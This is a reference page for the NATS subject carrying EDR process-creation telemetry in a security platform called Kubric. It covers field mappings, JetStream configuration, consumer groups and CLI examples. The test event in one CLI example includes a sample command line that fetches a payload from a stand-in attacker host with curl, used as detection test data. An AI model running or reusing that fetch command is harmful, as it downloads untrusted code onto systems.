# K-MB-SUB-001 — EDR Process Activity

> NATS subject mapping reference for process telemetry in the Kubric UIDR platform.

## Subject Pattern

```
kubric.edr.process.v1
kubric.edr.process.v1.<tenant_id>
kubric.edr.process.v1.<tenant_id>.<host_id>
```

Wildcard subscription: `kubric.edr.process.>`

## Publisher

| Component | Language | Description |
|-----------|----------|-------------|
| **CoreSec** | Rust | Endpoint agent collecting real-time process creation, termination, and execution events via eBPF (Linux) or ETW (Windows). Publishes on every `execve`/`CreateProcess` syscall. |

## Consumer(s)

| Consumer | Language | Role |
|----------|----------|------|
| **KAI-TRIAGE** | Python (CrewAI) | Primary consumer. Receives process events and runs alert enrichment pipeline: MITRE ATT&CK mapping, parent-child tree reconstruction, reputation lookup, and severity scoring. |

## Payload (OCSF Class)

- **OCSF Class**: Process Activity (`4007`)
- **OCSF Category**: System Activity
- **Schema Version**: OCSF 1.1
- **Serialization**: Protobuf 3 (wire), JSON (debug/replay)

## Fields

| # | Field | Protobuf Type | OCSF Mapping | Description |
|---|-------|---------------|--------------|-------------|
| 1 | `pid` | `uint32` | `process.pid` | Process ID of the spawned process. |
| 2 | `ppid` | `uint32` | `process.parent_process.pid` | Parent process ID. |
| 3 | `executable` | `string` | `process.file.path` | Full path to the executable binary. |
| 4 | `cmdline` | `string` | `process.cmd_line` | Full command line including arguments. |
| 5 | `uid` | `uint32` | `actor.user.uid` | UID of the user who launched the process. |
| 6 | `timestamp_ns` | `uint64` | `time` | Event timestamp in nanoseconds since Unix epoch. |
| 7 | `tenant_id` | `string` | `metadata.tenant_uid` | Kubric tenant identifier. |
| 8 | `host_id` | `string` | `device.uid` | Unique host identifier assigned by CoreSec. |
| 9 | `activity_id` | `uint32` | `activity_id` | OCSF activity: 1=Launch, 2=Terminate, 3=Open, 4=Inject. |
| 10 | `severity_id` | `uint32` | `severity_id` | OCSF severity: 0=Unknown through 5=Critical. |

## JetStream Configuration

```json
{
  "stream": {
    "name": "KUBRIC_EDR",
    "subjects": ["kubric.edr.>"],
    "retention": "limits",
    "max_age": "7d",
    "max_bytes": 53687091200,
    "max_msg_size": 65536,
    "storage": "file",
    "num_replicas": 3,
    "discard": "old",
    "duplicate_window": "2m",
    "allow_rollup_hdrs": false,
    "deny_delete": true,
    "deny_purge": false
  }
}
```

| Parameter | Value | Rationale |
|-----------|-------|-----------|
| `name` | `KUBRIC_EDR` | Shared stream for all EDR subjects (`kubric.edr.>`). |
| `subjects` | `kubric.edr.>` | Captures process, file, and future EDR event types. |
| `max_age` | `7d` (604800s) | Retain raw events for 7 days; long-term storage handled by object-store tier (S3/MinIO). |
| `retention` | `limits` | Discard oldest messages when limits are hit. |
| `max_bytes` | `50 GB` (53687091200) | Per-stream cap to prevent runaway disk usage. |
| `num_replicas` | `3` | R3 for durability across NATS cluster nodes. |

## Consumer Groups

| Consumer Name | Durable | Filter Subject | Deliver Policy | Ack Policy | Max Deliver | Ack Wait |
|---------------|---------|----------------|----------------|------------|-------------|----------|
| `kai-triage-process` | Yes | `kubric.edr.process.v1.>` | `all` | `explicit` | 5 | 30s |
| `siem-export-edr` | Yes | `kubric.edr.>` | `all` | `explicit` | 3 | 60s |
| `replay-debug` | No | `kubric.edr.process.v1.>` | `last` | `none` | 1 | — |

- **kai-triage-process**: Primary enrichment consumer. Runs as a pull-based consumer group with horizontal scaling (multiple KAI-TRIAGE workers pull from the same durable consumer).
- **siem-export-edr**: Feeds process events to external SIEM (e.g., Wazuh/Elasticsearch) for customer-facing dashboards.
- **replay-debug**: Ephemeral consumer for developer debugging and event replay.

## Example (NATS CLI)

### Publish a test process event

```bash
nats pub kubric.edr.process.v1.tenant-acme.host-01 \
  --header="Nats-Msg-Id:proc-$(uuidgen)" \
  '{"pid":1234,"ppid":1,"executable":"/usr/bin/curl","cmdline":"curl -s https://evil.example.com/payload","uid":1000,"timestamp_ns":1718900000000000000,"tenant_id":"tenant-acme","host_id":"host-01","activity_id":1,"severity_id":3}'
```

### Subscribe to all process events

```bash
nats sub "kubric.edr.process.>"
```

### Create the JetStream stream

```bash
nats stream add KUBRIC_EDR \
  --subjects="kubric.edr.>" \
  --retention=limits \
  --max-age=7d \
  --max-bytes=53687091200 \
  --max-msg-size=65536 \
  --storage=file \
  --replicas=3 \
  --discard=old \
  --dupe-window=2m \
  --no-deny-delete \
  --deny-purge=false
```

### Create the triage consumer

```bash
nats consumer add KUBRIC_EDR kai-triage-process \
  --filter="kubric.edr.process.v1.>" \
  --ack=explicit \
  --deliver=all \
  --max-deliver=5 \
  --wait=30s \
  --pull \
  --durable="kai-triage-process"
```

### Pull messages for processing

```bash
nats consumer next KUBRIC_EDR kai-triage-process --count=10
```

### View stream info

```bash
nats stream info KUBRIC_EDR
nats stream report
```

## Notes

- **Deduplication**: The `Nats-Msg-Id` header is set to `proc-<uuid>` by CoreSec to enable JetStream deduplication within the 2-minute window. This prevents duplicate events from agent restart or network retry.
- **Backpressure**: If KAI-TRIAGE falls behind, messages remain in the stream up to `max_age` (7d). Alerting is configured on consumer pending count > 100,000 via Prometheus metrics (`nats_consumer_num_pending`).
- **Schema evolution**: Subject includes `v1` for versioning. When the protobuf schema changes in a breaking way, a new subject `kubric.edr.process.v2` will be introduced alongside `v1` during migration.
- **Multi-tenancy**: Tenant isolation is enforced at the NATS account level. Each tenant's CoreSec agents publish only to their own `<tenant_id>` segment. KAI-TRIAGE subscribes to `>` wildcard but filters by tenant in application logic for cross-tenant correlation.
- **Wire format**: Production payloads use Protobuf 3 for efficiency. The JSON examples above are for illustration and debugging only. The `nats pub` CLI examples use JSON; actual agents serialize with `prost` (Rust) or `protobuf` (Python).
